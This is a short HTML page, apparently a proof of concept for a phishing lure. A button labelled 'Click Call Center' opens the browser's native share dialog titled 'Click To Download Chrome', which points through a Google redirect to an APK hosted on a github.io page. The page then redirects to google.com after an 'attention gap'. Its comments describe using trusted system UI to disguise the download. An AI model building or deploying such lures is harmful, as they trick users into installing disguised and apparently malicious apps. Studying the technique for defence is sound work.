<!DOCTYPE html>
<html>
<body>

<input
  type="button"
  value="Click Call Center"
  onclick="
  /* 1️⃣ Trusted system UI (Web Share) */
  if (navigator.share) {
    navigator.share({
      title: 'Click To Download Chrome',

      url: 'https://www.google.com/url?q=https://ecdnts-del.github.io/test-apk/chrome.apk'
    }).catch(()=>{});
  }

  /* 2️⃣ State change / navigation after attention gap */
  setTimeout(function() {
    location.href = 'https://google.com';
  }, 800);
  "
>

</body>
</html>
